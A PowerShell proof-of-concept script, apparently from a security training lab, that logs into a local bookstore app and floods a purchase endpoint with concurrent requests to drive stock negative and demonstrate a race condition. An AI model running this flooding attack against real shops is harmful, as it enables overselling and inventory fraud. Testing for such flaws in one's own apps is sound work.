# Race Condition Test - Using Real Purchase Flow
param(
    [int]$Threads = 15,
    [int]$PurchasesPerThread = 3
)

$BaseUrl = "http://localhost:8080"
$BookId = "1"
$Email = "alice@secchamp.com"  
$Password = "password123"

Write-Host "Race Condition Test - $Threads threads x $PurchasesPerThread purchases each" -ForegroundColor Cyan
Write-Host "Using DIRECT race test endpoint for maximum race condition potential" -ForegroundColor Yellow

# Login
$loginBody = @{ email = $Email; password = $Password } | ConvertTo-Json
$loginResponse = Invoke-RestMethod -Uri "$BaseUrl/api/auth/login" -Method POST -Body $loginBody -ContentType "application/json"
$token = $loginResponse.token
Write-Host "Login OK, token received" -ForegroundColor Green

$headers = @{ "Authorization" = "Bearer $token"; "Content-Type" = "application/json" }

# Concurrent test
Write-Host "Starting $Threads concurrent threads, each making $PurchasesPerThread purchases..." -ForegroundColor Yellow

$scriptBlock = {
    param($baseUrl, $bookId, $token, $purchasesPerThread, $threadId)
    $results = @()
    
    # Recreate headers inside the job to avoid serialization issues
    $headers = @{ 
        "Authorization" = "Bearer $token"
        "Content-Type" = "application/json" 
    }
    
    for ($i = 1; $i -le $purchasesPerThread; $i++) {
        try {
            # Direct race condition test - bypasses session locking for pure race condition
            $response = Invoke-RestMethod -Uri "$baseUrl/api/purchase/race-test/$bookId" -Method POST -Headers $headers -TimeoutSec 10
            
            $results += @{ 
                success = $response.success
                stock = $response.currentStock
                threadId = $threadId
                purchaseNum = $i
                message = $response.message
                title = if ($response.title) { $response.title } else { "N/A" }
            }
            
            # Minimal delay to avoid overwhelming server
            Start-Sleep -Milliseconds 10
        } catch {
            $errorDetails = ""
            if ($_.ErrorDetails -and $_.ErrorDetails.Message) {
                $errorDetails = $_.ErrorDetails.Message
            }
            $results += @{ 
                success = $false
                error = $_.Exception.Message
                threadId = $threadId
                purchaseNum = $i
                details = $errorDetails
                statusCode = if ($_.Exception.Response) { $_.Exception.Response.StatusCode } else { "Unknown" }
                requestUri = if ($_.Exception.Response) { $_.Exception.Response.ResponseUri } else { "Unknown" }
            }
        }
    }
    return $results
}

$jobs = @()

# Start all jobs quickly
for ($i = 1; $i -le $Threads; $i++) {
    $jobs += Start-Job -ScriptBlock $scriptBlock -ArgumentList $BaseUrl, $BookId, $token, $PurchasesPerThread, $i
}

# Collect results
$allResults = @()
foreach ($job in $jobs) {
    $jobResults = Receive-Job -Job $job -Wait
    $allResults += $jobResults
    Remove-Job -Job $job
}

# Analysis
$successful = ($allResults | Where-Object { $_.success }).Count
$failed = ($allResults | Where-Object { -not $_.success }).Count
$stockLevels = $allResults | Where-Object { $_.success } | ForEach-Object { $_.stock } | Sort-Object -Unique

Write-Host "Results:" -ForegroundColor Cyan
Write-Host "Total Purchases Attempted: $($Threads * $PurchasesPerThread)"
Write-Host "Successful: $successful"
Write-Host "Failed: $failed"

# Show error details if many requests failed
if ($failed -gt 0) {
    Write-Host "`nError Analysis:" -ForegroundColor Red
    $failedResults = $allResults | Where-Object { -not $_.success }
    $errorGroups = $failedResults | Group-Object -Property error
    foreach ($errorGroup in $errorGroups) {
        Write-Host "  $($errorGroup.Count)x: $($errorGroup.Name)" -ForegroundColor Red
    }
    
    # Show first few detailed errors
    Write-Host "`nFirst 3 detailed errors:" -ForegroundColor Red
    $failedResults | Select-Object -First 3 | ForEach-Object {
        Write-Host "  Thread $($_.threadId) Purchase $($_.purchaseNum): $($_.error)" -ForegroundColor Red
        if ($_.details) {
            Write-Host "    Details: $($_.details)" -ForegroundColor Red
        }
    }
}

Write-Host "Stock levels seen: $($stockLevels -join ', ')"

if ($stockLevels.Count -gt 0) {
    $minStock = ($stockLevels | Measure-Object -Minimum).Minimum
    $maxStock = ($stockLevels | Measure-Object -Maximum).Maximum
    Write-Host "Stock range: $maxStock → $minStock"

    if ($minStock -lt 0) {
        Write-Host "`nRACE CONDITION SUCCESS! Negative stock achieved: $minStock" -ForegroundColor Red
        Write-Host "This proves the vulnerability allows overselling!" -ForegroundColor Red
    } else {
        Write-Host "`nStock stayed non-negative: $minStock" -ForegroundColor Yellow
        Write-Host "Try increasing threads or purchases with: .\race-test-fixed.ps1 -Threads 20 -PurchasesPerThread 5" -ForegroundColor Blue
    }
} else {
    Write-Host "`nNo stock levels recorded due to all failures" -ForegroundColor Red
    Write-Host "Check server status and book ID $BookId exists with stock > 0" -ForegroundColor Yellow
}
